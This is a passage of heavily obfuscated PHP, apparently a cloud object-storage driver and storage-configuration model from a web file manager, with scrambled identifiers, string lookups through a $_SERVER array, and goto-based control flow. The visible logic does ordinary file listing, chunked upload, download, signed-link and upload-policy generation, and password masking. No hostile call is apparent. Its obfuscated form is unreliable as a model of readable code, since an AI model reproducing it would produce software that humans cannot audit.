$­ÁçĞ¯‘[$ô£ø•¨¼[1296]] ? !0 : $this->getPathOuter($ñ«¿àóà); } public function delFile($œ„¡Ä¶Ã) { $Ä°–¤ùÁ =& $_SERVER[´È¥ö†ö]; $¯ºãĞ© = $this->ussRequest($œ„¡Ä¶Ã, $Ä°–¤ùÁ[1568]); return $¯ºãĞ©[$Ä°–¤ùÁ[1296]] ? !0 : !1; } public function delFolder($Æâ…Û—¹) { $İŒÎêÀ =& $_SERVER[´È¥ö†ö]; if (!$this->exist($Æâ…Û—¹)) { return !0; } $this->listItemCache = !1; $–“ü»ñ = $‚şíôäÑ = array(); $this->fileList($Æâ…Û—¹, $–“ü»ñ, $‚şíôäÑ, !0); $this->listItemCache = !0; foreach ($‚şíôäÑ as $¨ÑœÍ¹) { $ªéãÎüÄ = $this->ussRequest($¨ÑœÍ¹[$İŒÎêÀ[32]], $İŒÎêÀ[1568]); if (!$ªéãÎüÄ[$İŒÎêÀ[1296]]) { return !1; } } usort($–“ü»ñ, function ($œö¹¼, $…ñıÊŸÅ) { $”Ùùæ¨µ =& $_SERVER[´È¥ö†ö]; return substr_count($…ñıÊŸÅ, $”Ùùæ¨µ[8]) - substr_count($œö¹¼, $”Ùùæ¨µ[8]); }); foreach ($–“ü»ñ as $µƒêûñ) { $ªéãÎüÄ = $this->ussRequest($µƒêûñ, $İŒÎêÀ[1568]); if (!$ªéãÎüÄ[$İŒÎêÀ[1296]]) { return !1; } } $ªéãÎüÄ = $this->ussRequest($Æâ…Û—¹, $İŒÎêÀ[1568]); return $ªéãÎüÄ[$İŒÎêÀ[1296]]; } public function rename($Ô±¯Å×, $º‰»ÌëÜ) { if ($this->isFile($Ô±¯Å×)) { $º‰»ÌëÜ = get_path_father($Ô±¯Å×) . $º‰»ÌëÜ; return $this->moveFile($Ô±¯Å×, $º‰»ÌëÜ); } return $this->renameObject($Ô±¯Å×, $º‰»ÌëÜ); } public function fileInfo($‚Á¡ùûß, $îï“Œ = false, $‰§Ä¡ó = array()) { $ÜÁ©ëÉ =& $_SERVER[´È¥ö†ö]; $Êš÷ñãÏ = array($ÜÁ©ëÉ[32] => $this->pathThis($‚Á¡ùûß), $ÜÁ©ëÉ[87] => $this->getPathOuter($ÜÁ©ëÉ[8] . $‚Á¡ùûß), $ÜÁ©ëÉ[33] => $ÜÁ©ëÉ[232], $ÜÁ©ëÉ[79] => isset($‰§Ä¡ó[$ÜÁ©ëÉ[79]]) ? $‰§Ä¡ó[$ÜÁ©ëÉ[79]] : 0, $ÜÁ©ëÉ[169] => $this->ext($‚Á¡ùûß)); if ($îï“Œ) { return $Êš÷ñãÏ; } $Êš÷ñãÏ[$ÜÁ©ëÉ[233]] = $Êš÷ñãÏ[$ÜÁ©ëÉ[88]] = 0; $Êš÷ñãÏ[$ÜÁ©ëÉ[234]] = $Êš÷ñãÏ[$ÜÁ©ëÉ[235]] = !0; if (empty($‰§Ä¡ó)) { $‰§Ä¡ó = $this->objectMeta($‚Á¡ùûß); if (!$‰§Ä¡ó) { return $Êš÷ñãÏ; } } $Êš÷ñãÏ[$ÜÁ©ëÉ[233]] = intval($‰§Ä¡ó[$ÜÁ©ëÉ[1569]]); $Êš÷ñãÏ[$ÜÁ©ëÉ[88]] = intval($‰§Ä¡ó[$ÜÁ©ëÉ[1570]]); $Êš÷ñãÏ[$ÜÁ©ëÉ[79]] = $‰§Ä¡ó[$ÜÁ©ëÉ[79]]; return $Êš÷ñãÏ; } public function folderInfo($öÊŒÚÍ˜, $° ¶ÁØ³ = false) { $°¯Ş´–ß =& $_SERVER[´È¥ö†ö]; $–Ø¨ŒÍ = array($°¯Ş´–ß[32] => $this->pathThis($öÊŒÚÍ˜), $°¯Ş´–ß[87] => $this->getPathOuter($°¯Ş´–ß[8] . $öÊŒÚÍ˜), $°¯Ş´–ß[33] => $°¯Ş´–ß[78]); if ($° ¶ÁØ³) { return $–Ø¨ŒÍ; } $–Ø¨ŒÍ[$°¯Ş´–ß[233]] = $–Ø¨ŒÍ[$°¯Ş´–ß[88]] = 0; $–Ø¨ŒÍ[$°¯Ş´–ß[234]] = $–Ø¨ŒÍ[$°¯Ş´–ß[235]] = !0; if (empty($êÈ©çó)) { $êÈ©çó = $this->objectMeta($öÊŒÚÍ˜); if (!$êÈ©çó) { return $–Ø¨ŒÍ; } } $–Ø¨ŒÍ[$°¯Ş´–ß[233]] = intval($êÈ©çó[$°¯Ş´–ß[1569]]); $–Ø¨ŒÍ[$°¯Ş´–ß[88]] = intval($êÈ©çó[$°¯Ş´–ß[1570]]); return $–Ø¨ŒÍ; } private function listObjs($§¬¨çÛÊ, $æôïö¥ = 0, $°“¾·Ü™ = 1000) { $ŸäĞÑ“á =& $_SERVER[´È¥ö†ö]; $‰…¨œç˜ = array($ŸäĞÑ“á[1571], $ŸäĞÑ“á[1572] . $°“¾·Ü™); if ($æôïö¥) { $‰…¨œç˜[] = $ŸäĞÑ“á[1573] . $æôïö¥; } $„¡ÄØ¸ = $this->ussRequest($§¬¨çÛÊ, $ŸäĞÑ“á[1495], !1, $‰…¨œç˜); return !$„¡ÄØ¸[$ŸäĞÑ“á[1296]] ? !1 : $„¡ÄØ¸[$ŸäĞÑ“á[1286]]; } private function fileList($Ù˜¸Ã¨î, &$Å”õµÁ†, &$ÜÜ™œ·å, $–“‰´ö€ = false) { $áÑŒö² =& $_SERVER[´È¥ö†ö]; $™Öï«« = $áÑŒö²[12]; $§º„øıî = 1000; $š‹µ¯Îï = rtrim($Ù˜¸Ã¨î, $áÑŒö²[8]) . $áÑŒö²[8]; while (!0) { check_abort(); $ÂŸÕÊÇ² = $this->listObjs($Ù˜¸Ã¨î, $™Öï««, $§º„øıî); if (!$ÂŸÕÊÇ²) { return !1; } $™Öï«« = isset($ÂŸÕÊÇ²[$áÑŒö²[1574]]) ? $ÂŸÕÊÇ²[$áÑŒö²[1574]] : $áÑŒö²[12]; $”ä‹é = isset($ÂŸÕÊÇ²[$áÑŒö²[1575]]) ? $ÂŸÕÊÇ²[$áÑŒö²[1575]] : array(); foreach ($”ä‹é as $×‡äÌˆ) { $²åÃïô¹ = $×‡äÌˆ[$áÑŒö²[33]] == $áÑŒö²[78] ? !0 : !1; $°Ë¡Ìô° = ltrim($š‹µ¯Îï . $×‡äÌˆ[$áÑŒö²[32]], $áÑŒö²[8]) . ($²åÃïô¹ ? $áÑŒö²[8] : $áÑŒö²[12]); $ößÛù·¢ = array($áÑŒö²[32] => $°Ë¡Ìô°, $áÑŒö²[33] => $²åÃïô¹ ? $áÑŒö²[78] : $áÑŒö²[232], $áÑŒö²[79] => $×‡äÌˆ[$áÑŒö²[423]], $áÑŒö²[1570] => $×‡äÌˆ[$áÑŒö²[1576]]); $this->cacheMethodInfoSet($°Ë¡Ìô°, $²åÃïô¹, $ößÛù·¢); if ($²åÃïô¹) { $Å”õµÁ†[] = $°Ë¡Ìô°; if ($–“‰´ö€) { $this->fileList($°Ë¡Ìô°, $Å”õµÁ†, $ÜÜ™œ·å, $–“‰´ö€); } continue; } $ÜÜ™œ·å[] = $ößÛù·¢; } if (count($”ä‹é) < $§º„øıî) { break; } } $this->cacheMethodInfoSet($Ù˜¸Ã¨î, !0); } public function listPath($Àì“Ôéª, $ì…ëè¡İ = false) { $ÂªıÄ™ß =& $_SERVER[´È¥ö†ö]; $Ó•¼¾ø = $†Î©ùÙ = array(); $this->fileList($Àì“Ôéª, $Ó•¼¾ø, $†Î©ùÙ); foreach ($Ó•¼¾ø as $¶ÉÙ€ô™ => $³ĞÔ·ëÙ) { $Ó•¼¾ø[$¶ÉÙ€ô™] = $this->folderInfo($³ĞÔ·ëÙ, $ì…ëè¡İ); } foreach ($†Î©ùÙ as $¶ÉÙ€ô™ => $³ĞÔ·ëÙ) { $†Î©ùÙ[$¶ÉÙ€ô™] = $this->fileInfo($³ĞÔ·ëÙ[$ÂªıÄ™ß[32]], $ì…ëè¡İ, $³ĞÔ·ëÙ); } return array($ÂªıÄ™ß[85] => $Ó•¼¾ø, $ÂªıÄ™ß[86] => $†Î©ùÙ); } public function has($Ìõ½î×ø, $’ˆâ‰£½ = false, $¹²À¾°’ = true) { $£ğ–àÏ =& $_SERVER[´È¥ö†ö]; $¬áÇ®Å = $£ğ–àÏ[12]; $á‡÷ç÷ = 500; $Ş×ıÄ’ = 0; $½Ó€¨Â² = 0; $ÑÔå€İê = rtrim($Ìõ½î×ø, $£ğ–àÏ[8]) . $£ğ–àÏ[8]; while (!0) { check_abort(); $‚¦›Â‰ = $this->listObjs($Ìõ½î×ø, $¬áÇ®Å, $á‡÷ç÷); if (!$‚¦›Â‰) { return !1; } $¬áÇ®Å = isset($‚¦›Â‰[$£ğ–àÏ[1574]]) ? $‚¦›Â‰[$£ğ–àÏ[1574]] : $£ğ–àÏ[12]; $—¬”Á‘ = isset($‚¦›Â‰[$£ğ–àÏ[1575]]) ? $‚¦›Â‰[$£ğ–àÏ[1575]] : array(); if (empty($—¬”Á‘)) { break; } $•®îÁ = array_filter($—¬”Á‘, function ($°—¸±²•) { $û™€·¼î =& $_SERVER[´È¥ö†ö]; return $°—¸±²•[$û™€·¼î[33]] == $û™€·¼î[78]; }); $íÃ§õÓ = count($—¬”Á‘); $•®îÁ = count($•®îÁ); $ ğ±·®¦ = $íÃ§õÓ - $•®îÁ; if ($’ˆâ‰£½) { $½Ó€¨Â² += $•®îÁ; $Ş×ıÄ’ += $ ğ±·®¦; if ($íÃ§õÓ < $á‡÷ç÷) { break; } continue; } if ($¹²À¾°’) { if ($ ğ±·®¦) { return !0; } } else { if ($•®îÁ) { return !0; } } if ($íÃ§õÓ < $á‡÷ç÷) { break; } } if ($’ˆâ‰£½) { return array($£ğ–àÏ[241] => $Ş×ıÄ’, $£ğ–àÏ[242] => $½Ó€¨Â²); } return !1; } public function listAll($¿ÖÊœºâ) { $­şÅŞŞ =& $_SERVER[´È¥ö†ö]; $„ë¸ÉÍÙ = $¿¹ü–€¶ = array(); $this->fileList($¿ÖÊœºâ, $„ë¸ÉÍÙ, $¿¹ü–€¶, !0); $óû¸ÓÊƒ = array_to_keyvalue($¿¹ü–€¶, $­şÅŞŞ[32]); foreach ($„ë¸ÉÍÙ as $å’Œ–…è) { if (is_string($å’Œ–…è)) { $óû¸ÓÊƒ[$å’Œ–…è] = array($­şÅŞŞ[79] => 0); } } return $this->listAllFiles($¿ÖÊœºâ, $óû¸ÓÊƒ); } public function canRead($°•©¹ïš) { return $this->exist($°•©¹ïš) ? !0 : !1; } public function canWrite($ÒÁ¬¤˜ˆ) { return $this->exist($ÒÁ¬¤˜ˆ) ? !0 : !1; } public function getContent($†„“½”) { return $this->fileSubstr($†„“½”, 0, -1); } public function setContent($œŸ’Áí¿, $Ìø™’­¿ = '') { $—±ƒÄ =& $_SERVER[´È¥ö†ö]; if (!$Ìø™’­¿) { $—ÕƒğÑ = $this->ussRequest($œŸ’Áí¿, $—±ƒÄ[290]); return $—ÕƒğÑ[$—±ƒÄ[1296]]; } $èú²÷†Å = $this->tempFile($this->pathThis($œŸ’Áí¿)); file_put_contents($èú²÷†Å, $Ìø™’­¿); if ($this->upload($œŸ’Áí¿, $èú²÷†Å)) { $this->tempFileRemve($èú²÷†Å); return !0; } return !1; } public function fileSubstr($ó¬ŸúâÃ, $Æ•¶¹¬, $åˆúºŒî) { $µ‚ô‹ÍÍ =& $_SERVER[´È¥ö†ö]; if (!($±·éÇœ™ = $this->link($ó¬ŸúâÃ))) { return !1; } $¬•“¥ÌÁ = !1; if ($åˆúºŒî > 0) { $ÒõûªÖ¨ = $Æ•¶¹¬ + $åˆúºŒî - 1; $¬•“¥ÌÁ = array($µ‚ô‹ÍÍ[1535] . $Æ•¶¹¬ . $µ‚ô‹ÍÍ[473] . $ÒõûªÖ¨); } $¦Ü…õíï = url_request($±·éÇœ™, $µ‚ô‹ÍÍ[1495], !1, $¬•“¥ÌÁ); return $¦Ü…õíï[$µ‚ô‹ÍÍ[826]] ? $¦Ü…õíï[$µ‚ô‹ÍÍ[1286]] : !1; } public function upload($¼Ò½”‹ç, $øóáÒ™í, $ªû‚§Î– = false, $‚ş”‚³– = REPEAT_REPLACE) { $ŒÙÎƒë” =& $_SERVER[´È¥ö†ö]; $ºÃ–…±¥ = IO::size($øóáÒ™í); if ($ºÃ–…±¥ <= 1024 * 1024 * 200) { $ğ·µßÆÀ = array($ŒÙÎƒë”[1577] . $øóáÒ™í); $éƒÏ¤˜Ä = $this->ussRequest($¼Ò½”‹ç, $ŒÙÎƒë”[255], $ğ·µßÆÀ); return $éƒÏ¤˜Ä[$ŒÙÎƒë”[1296]] ? $this->getPathOuter($¼Ò½”‹ç) : !1; } $¥œÂ©û¡ = 1024 * 1024 * 10; $µğÈàë = array($ŒÙÎƒë”[1578], $ŒÙÎƒë”[1579] . $ºÃ–…±¥, $ŒÙÎƒë”[1580], $ŒÙÎƒë”[1581] . $¥œÂ©û¡); $éƒÏ¤˜Ä = $this->ussRequest($¼Ò½”‹ç, $ŒÙÎƒë”[255], !1, $µğÈàë); if (!$éƒÏ¤˜Ä[$ŒÙÎƒë”[1296]]) { return !1; } $—í…­¹Í = $éƒÏ¤˜Ä[$ŒÙÎƒë”[1286]]; $²şïŒäÚ = 0; $îı€–Ã = $—í…­¹Í[$ŒÙÎƒë”[1582]]; $ˆ Ì¤Ì = fopen($øóáÒ™í, $ŒÙÎƒë”[1458]); if (!$ˆ Ì¤Ì) { return !1; } do { $ˆñğºØÑ = $—í…­¹Í[$ŒÙÎƒë”[1583]]; fseek_64($ˆ Ì¤Ì, $²şïŒäÚ); $•­·Š‡· = fread($ˆ Ì¤Ì, $ˆñğºØÑ); $›İÙÏ = 0; do { $›İÙÏ++; $—í…­¹Í = $this->uploadPart($¼Ò½”‹ç, $—í…­¹Í, $•­·Š‡·); } while (!$—í…­¹Í && $›İÙÏ < 3); if (!$—í…­¹Í) { return !1; } $îı€–Ã = $—í…­¹Í[$ŒÙÎƒë”[1582]]; $²şïŒäÚ += $ˆñğºØÑ; } while ($îı€–Ã != -1); fclose($ˆ Ì¤Ì); $µğÈàë = array($ŒÙÎƒë”[1584], $ŒÙÎƒë”[1585] . $—í…­¹Í[$ŒÙÎƒë”[1586]], $ŒÙÎƒë”[1580]); $éƒÏ¤˜Ä = $this->ussRequest($¼Ò½”‹ç, $ŒÙÎƒë”[255], !1, $µğÈàë); return $éƒÏ¤˜Ä[$ŒÙÎƒë”[1296]] ? $this->getPathOuter($¶–˜¦ã¥) : !1; } private function uploadPart($öÙ€Ê‹, $Ğ¿ƒÃüµ, &$ï÷Ç€‚•) { $¯¨˜½°• =& $_SERVER[´È¥ö†ö]; $Ä¤‘Ë¤ = array($¯¨˜½°•[1587], $¯¨˜½°•[1585] . $Ğ¿ƒÃüµ[$¯¨˜½°•[1586]], $¯¨˜½°•[1588] . $Ğ¿ƒÃüµ[$¯¨˜½°•[1582]], $¯¨˜½°•[146] . $Ğ¿ƒÃüµ[$¯¨˜½°•[1583]]); $¤ìÛ¡à˜ = $this->ussRequest($öÙ€Ê‹, $¯¨˜½°•[255], $ï÷Ç€‚•, $Ä¤‘Ë¤); return !$¤ìÛ¡à˜[$¯¨˜½°•[1296]] ? $¤ìÛ¡à˜[$¯¨˜½°•[1296]] : $¤ìÛ¡à˜[$¯¨˜½°•[1286]]; } public function uploadFormData($ıššÔŠÆ, $æçâí£ = 3600) { return $this->uploadPolicy($ıššÔŠÆ, $æçâí£); } public function uploadMultiData($¯ª™Åíø, $¦á˜úæ¼ = 3600) { $Ë÷›Õıª =& $_SERVER[´È¥ö†ö]; $áÕ¶öò¸ = (int) $GLOBALS[$Ë÷›Õıª[7]][$Ë÷›Õıª[79]]; return $this->uploadPolicy($¯ª™Åíø, $¦á˜úæ¼, $áÕ¶öò¸); } private function uploadPolicy($°ÚÑèš, $¸ì†¯Ûí = 3600, $Œá²¾­Â = 0) { $»›í¼Ô¶ =& $_SERVER[´È¥ö†ö]; $à äŸ‚í = $»›í¼Ô¶[8] . $this->bucket; $µÕÉ = gmdate($»›í¼Ô¶[1493]); $øÁ”³ÍÎ = array($»›í¼Ô¶[1589] => $this->bucket, $»›í¼Ô¶[1590] => $°ÚÑèš, $»›í¼Ô¶[1591] => time() + $¸ì†¯Ûí, $»›í¼Ô¶[1592] => $µÕÉ); if ($Œá²¾­Â) { $øÁ”³ÍÎ[$»›í¼Ô¶[1478]] = $Œá²¾­Â; } $ô³‚¯Éã = base64_encode(json_encode($øÁ”³ÍÎ)); $ÒßâŠé = base64_encode(hash_hmac($»›í¼Ô¶[1546], "\120\117\x53\124\x26{$à äŸ‚í}\x26{$µÕÉ}\46{$ô³‚¯Éã}", md5("{$this->userpass}"), !0)); $¥†÷ñ‹è = array($»›í¼Ô¶[279] => $ô³‚¯Éã, $»›í¼Ô¶[1593] => "\x55\x50\131\x55\116\40{$this->username}\72{$ÒßâŠé}", $»›í¼Ô¶[208] => $this->endpoint . $à äŸ‚í); return $¥†÷ñ‹è; } public function download($³Î¹ç€Ş, $Œ½§àƒ¹) { $Ô‡õä¶æ = IO::getPathInner(IO::mkfile($Œ½§àƒ¹)); if (!($ç¯”âÅ± = $this->link($³Î¹ç€Ş))) { return !1; } $¿˜À«ã = 0; $èø–ÙÎÏ = 1024 * 200; $÷‰È‰§ = fopen($Ô‡õä¶æ, $_SERVER[´È¥ö†ö][1541]); while (!0) { $’¾è‹÷ı = $this->fileSubstr($³Î¹ç€Ş, $¿˜À«ã, $èø–ÙÎÏ); if ($’¾è‹÷ı === !1) { return !1; } fwrite($÷‰È‰§, $’¾è‹÷ı); $¿˜À«ã += $èø–ÙÎÏ; if (strlen($’¾è‹÷ı) < $èø–ÙÎÏ) { break; } } fclose($÷‰È‰§); return $Œ½§àƒ¹; } public function link($€ğù©, $õĞÔ·Ôã = array()) { $Ëæ­åè‰ =& $_SERVER[´È¥ö†ö]; $€ğù© = trim($€ğù©, $Ëæ­åè‰[8]); if (!empty($this->token)) { $»¢òÁ© = strtotime(date($Ëæ­åè‰[1594])); $¼¥‹ú— = substr(md5($this->token . $Ëæ­åè‰[286] . $»¢òÁ© . $Ëæ­åè‰[1595] . $€ğù©), 12, 8) . $»¢òÁ©; $õĞÔ·Ôã[] = $Ëæ­åè‰[1596] . $¼¥‹ú—; } $²èù”ã = !empty($õĞÔ·Ôã) ? $Ëæ­åè‰[76] . implode($Ëæ­åè‰[286], $õĞÔ·Ôã) : $Ëæ­åè‰[12]; return $this->getHost() . $Ëæ­åè‰[8] . $this->pathEncode($€ğù©) . $²èù”ã; } public function fileOut($Ãü—ñª¦, $ññğÜÒõ = false, $½¡ƒÕ×  = false, $ü“¦œ³À = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($Ãü—ñª¦, $ññğÜÒõ, $½¡ƒÕ× , $ü“¦œ³À); } if (!$½¡ƒÕ× ) { $½¡ƒÕ×  = $this->pathThis($Ãü—ñª¦); } $†¨ÜŠéø = $ññğÜÒõ ? array($_SERVER[´È¥ö†ö][1597] . rawurlencode($½¡ƒÕ× )) : array(); $›ù”É‰Å = $this->link($Ãü—ñª¦, $†¨ÜŠéø); $this->fileOutLink($›ù”É‰Å); } public function fileOutServer($Óóà›Ë, $®¾¢¶ğ€ = false, $òÈßåóç = false, $şÛ—Ó… = '') { parent::fileOut($Óóà›Ë, $®¾¢¶ğ€, $òÈßåóç, $şÛ—Ó…); } public function fileOutImage($•İ†‰†ú, $˜Ç¡¯•Â = 250) { $á±¾´» = $this->link($•İ†‰†ú . $_SERVER[´È¥ö†ö][1598] . $˜Ç¡¯•Â); $this->fileOutLink($á±¾´»); } public function fileOutImageServer($Ç²èø ’, $ù’öÊ¼… = 250) { parent::fileOutImage($Ç²èø ’, $ù’öÊ¼…); } public function hashMd5($†‘ÖŒšÚ) { $Àù¢ìÊÌ =& $_SERVER[´È¥ö†ö]; $øµÅğÊ = $this->_objectMeta($†‘ÖŒšÚ); return isset($øµÅğÊ[$Àù¢ìÊÌ[247]]) ? $øµÅğÊ[$Àù¢ìÊÌ[247]] : !1; } public function size($˜è…íÕÄ) { $‰®œ˜†· = $this->objectMeta($˜è…íÕÄ); return $‰®œ˜†· ? $‰®œ˜†·[$_SERVER[´È¥ö†ö][79]] : 0; } public function info($° „öŞ) { if ($this->isFolder($° „öŞ)) { return $this->folderInfo($° „öŞ); } else { if ($this->isFile($° „öŞ)) { return $this->fileInfo($° „öŞ); } } return !1; } public function exist($ñ‹ÅÇ‡) { return $this->isFile($ñ‹ÅÇ‡) || $this->isFolder($ñ‹ÅÇ‡); } public function isFile($«ğ­ù) { return !$this->isFolder($«ğ­ù) && $this->objectMeta($«ğ­ù); } public function isFolder($Ââ¿ÙßÉ) { return $this->cacheMethod($_SERVER[´È¥ö†ö][179], $Ââ¿ÙßÉ); } protected function objectMeta($–Ûñ¿…ª) { return $this->cacheMethod($_SERVER[´È¥ö†ö][181], $–Ûñ¿…ª); } protected function _objectMeta($†Ü©§•Å) { $ëì¤Î¯  =& $_SERVER[´È¥ö†ö]; if ($†Ü©§•Å == $ëì¤Î¯ [12] || $†Ü©§•Å == $ëì¤Î¯ [8]) { return array(); } $´†—è = $this->ussRequest($†Ü©§•Å, $ëì¤Î¯ [1599]); if (!$´†—è[$ëì¤Î¯ [1296]]) { return null; } $—ù˜…Ä‹ = isset($´†—è[$ëì¤Î¯ [1286]]) ? $´†—è[$ëì¤Î¯ [1286]] : array(); if (!isset($—ù˜…Ä‹[$ëì¤Î¯ [1600]])) { return null; } $­ÜÖìı™ = array($ëì¤Î¯ [33] => isset($—ù˜…Ä‹[$ëì¤Î¯ [1600]]) ? $—ù˜…Ä‹[$ëì¤Î¯ [1600]] : null, $ëì¤Î¯ [79] => isset($—ù˜…Ä‹[$ëì¤Î¯ [1601]]) ? $—ù˜…Ä‹[$ëì¤Î¯ [1601]] : null, $ëì¤Î¯ [247] => isset($—ù˜…Ä‹[$ëì¤Î¯ [1602]]) ? $—ù˜…Ä‹[$ëì¤Î¯ [1602]] : null, $ëì¤Î¯ [1569] => isset($—ù˜…Ä‹[$ëì¤Î¯ [1603]]) ? $—ù˜…Ä‹[$ëì¤Î¯ [1603]] : null); $­ÜÖìı™[$ëì¤Î¯ [1570]] = isset($—ù˜…Ä‹[$ëì¤Î¯ [1604]]) ? strtotime($—ù˜…Ä‹[$ëì¤Î¯ [1604]]) : $­ÜÖìı™[$ëì¤Î¯ [1569]]; return $­ÜÖìı™; } protected function _isFolder($ñ¾¹ˆ©˜) { $ìÚùÉ¹ =& $_SERVER[´È¥ö†ö]; if ($ñ¾¹ˆ©˜ == $ìÚùÉ¹[12] || $ñ¾¹ˆ©˜ == $ìÚùÉ¹[8]) { return !0; } $Ôâ…Ááá = $this->_objectMeta($ñ¾¹ˆ©˜); return isset($Ôâ…Ááá[$ìÚùÉ¹[33]]) && $Ôâ…Ááá[$ìÚùÉ¹[33]] == $ìÚùÉ¹[78] ? !0 : !1; } } goto D“Ñ¬‘‰; e•›ˆªÇîà: class StorageModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\x65\155\56\163\x74\157\x72\x61\x67\145\114\x69\163\x74"; public $field = array("\156\141\155\x65", "\x73\151\172\145\x4d\141\x78", "\163\x79\x73\164\145\155", "\x64\x65\x66\x61\165\x6c\x74", "\144\162\151\166\x65\x72", "\x63\x6f\156\146\x69\147"); public function listData($ÉãûñÏë = false, $ÙöŒØÅƒ = "\155\x6f\x64\151\146\x79\x54\x69\155\145", $¸ğÜÉ¾ = false) { $†ï²›Î =& $_SERVER[´È¥ö†ö]; $ğ» ­©÷ = parent::listData($ÉãûñÏë, $ÙöŒØÅƒ, $¸ğÜÉ¾); if ($ÉãûñÏë) { return $ğ» ­©÷; } $Ê¸“¶›Ü = array(); if ($GLOBALS[$†ï²›Î[2307]]) { $Ê¸“¶›Ü = $this->ioSizeUseGet(array_to_keyvalue($ğ» ­©÷, $†ï²›Î[12], $†ï²›Î[486])); } foreach ($ğ» ­©÷ as $ºÜ»ë‚  => $½‘ò÷ë) { unset($ğ» ­©÷[$ºÜ»ë‚ ][$†ï²›Î[6]]); $ğ» ­©÷[$ºÜ»ë‚ ][$†ï²›Î[1962]] = isset($Ê¸“¶›Ü[$½‘ò÷ë[$†ï²›Î[486]]]) ? $Ê¸“¶›Ü[$½‘ò÷ë[$†ï²›Î[486]]] : 0; } return $ğ» ­©÷; } public function ioSizeUseGet($Ó…¯È¡Ë) { $†Ì¦íÂ =& $_SERVER[´È¥ö†ö]; if (!$Ó…¯È¡Ë) { return array(); } $âç ©¸ª = $†Ì¦íÂ[2308] . implode($†Ì¦íÂ[50], $Ó…¯È¡Ë); $ù©Î = Cache::get($âç ©¸ª); if ($ù©Î) { return $ù©Î; } $Õ„¦ôÕÀ = array($†Ì¦íÂ[894] => $†Ì¦íÂ[486], $†Ì¦íÂ[2309] => $†Ì¦íÂ[79]); $É‰¹ÇòØ = array($†Ì¦íÂ[894] => array($†Ì¦íÂ[7], $Ó…¯È¡Ë)); $ù©Î = Model($†Ì¦íÂ[866])->field($Õ„¦ôÕÀ)->where($É‰¹ÇòØ)->group($†Ì¦íÂ[894])->select(); $ù©Î = array_to_keyvalue($ù©Î, $†Ì¦íÂ[486], $†Ì¦íÂ[79]); Cache::set($âç ©¸ª, $ù©Î, 600); return $ù©Î; } public function getConfig($œ‹Ñ–²) { $Å™óá®ü = parent::listData($œ‹Ñ–²); $„îıíø¬ = _get($Å™óá®ü, $_SERVER[´È¥ö†ö][6], array()); if ($„îıíø¬ && !is_array($„îıíø¬)) { $„îıíø¬ = json_decode($„îıíø¬, !0); } return $„îıíø¬; } public function update($•â§¾­ä, $áÙ±­¨) { $³€Úà±¯ =& $_SERVER[´È¥ö†ö]; $”¼ú°Ì = $áÙ±­¨[$³€Úà±¯[32]]; $ëø÷‚² = array_to_keyvalue(parent::listData(), $³€Úà±¯[32]); if (isset($ëø÷‚²[$”¼ú°Ì]) && $ëø÷‚²[$”¼ú°Ì][$³€Úà±¯[486]] != $•â§¾­ä) { return !1; } $this->checkPwd($•â§¾­ä, $áÙ±­¨); if (isset($áÙ±­¨[$³€Úà±¯[2310]]) && $áÙ±­¨[$³€Úà±¯[2310]] == $³€Úà±¯[91]) { $this->checkConfig($áÙ±­¨); } unset($áÙ±­¨[$³€Úà±¯[2310]]); $“Š¢ƒú‘ = parent::update($•â§¾­ä, $áÙ±­¨); if ($“Š¢ƒú‘ && $áÙ±­¨[$³€Úà±¯[37]]) { $û²ÜğÚº = 0; foreach ($ëø÷‚² as $œÍ–Û¨´) { if ($œÍ–Û¨´[$³€Úà±¯[37]] && $œÍ–Û¨´[$³€Úà±¯[486]] != $•â§¾­ä) { $û²ÜğÚº = $œÍ–Û¨´[$³€Úà±¯[486]]; parent::update($œÍ–Û¨´[$³€Úà±¯[486]], array($³€Úà±¯[37] => 0)); } } $this->updateBackup($•â§¾­ä, $û²ÜğÚº); } return $“Š¢ƒú‘; } public function add($üÇÍÓ“) { $©Ô¬Şëğ =& $_SERVER[´È¥ö†ö]; $ñã¨íÖ = array_to_keyvalue(parent::listData(), $©Ô¬Şëğ[32]); if (isset($ñã¨íÖ[$üÇÍÓ“[$©Ô¬Şëğ[32]]])) { return !1; } $this->checkConfig($üÇÍÓ“); $¸ú‚îó… = parent::insert($üÇÍÓ“); if ($¸ú‚îó… && $üÇÍÓ“[$©Ô¬Şëğ[37]]) { foreach ($ñã¨íÖ as $õö²šŒ‰) { if ($õö²šŒ‰[$©Ô¬Şëğ[37]]) { parent::update($õö²šŒ‰[$©Ô¬Şëğ[486]], array($©Ô¬Şëğ[37] => 0)); } } } return $¸ú‚îó…; } public function updateBackup($éÂÁÈ¡, $Î‡•â) { $Ì…­£ÙÚ =& $_SERVER[´È¥ö†ö]; if (!$Î‡•â) { return; } $ç™Ç²©¡ = Model($Ì…­£ÙÚ[824])->config(); if ($ç™Ç²©¡[$Ì…­£ÙÚ[1742]] != $Ì…­£ÙÚ[91] || $ç™Ç²©¡[$Ì…­£ÙÚ[828]] != $Î‡•â) { return; } $¹Ò¤ÔÕ = Model($Ì…­£ÙÚ[846])->get($Ì…­£ÙÚ[860]); $¹Ò¤ÔÕ = json_decode($¹Ò¤ÔÕ, !0); if (!$¹Ò¤ÔÕ) { return; } $¹Ò¤ÔÕ[$Ì…­£ÙÚ[828]] = $éÂÁÈ¡; Model($Ì…­£ÙÚ[846])->set(array($Ì…­£ÙÚ[860] => $¹Ò¤ÔÕ)); } public function checkPwd($×àÔ‡ñ, &$ÔîÅ¸¥) { $œ»ÒË• =& $_SERVER[´È¥ö†ö]; if (empty($ÔîÅ¸¥[$œ»ÒË•[6]])) { return; } $ñÁ÷öÕ = $ÔîÅ¸¥[$œ»ÒË•[6]]; if (!is_array($ñÁ÷öÕ)) { $ñÁ÷öÕ = json_decode($ñÁ÷öÕ, !0); } $Æùæ‰Ë¦ = $œ»ÒË•[12]; $ìÄô”ğ = array($œ»ÒË•[2311], $œ»ÒË•[2312], $œ»ÒË•[965]); foreach ($ìÄô”ğ as $¥ÑÎ‚¨) { if (isset($ñÁ÷öÕ[$¥ÑÎ‚¨])) { $Æùæ‰Ë¦ = $¥ÑÎ‚¨; break; } } if (!$Æùæ‰Ë¦) { return; } $¹Ù¿ä”Î = $this->getConfig($×àÔ‡ñ); $ùåô¼¬â = $¹Ù¿ä”Î[$Æùæ‰Ë¦]; $Ìä¥í…ï = $ñÁ÷öÕ[$Æùæ‰Ë¦]; if ($Ìä¥í…ï == str_repeat($œ»ÒË•[222], strlen($ùåô¼¬â))) { $ñÁ÷öÕ[$Æùæ‰Ë¦] = $ùåô¼¬â; $ÔîÅ¸¥[$œ»ÒË•[6]] = json_encode($ñÁ÷öÕ); } else { if 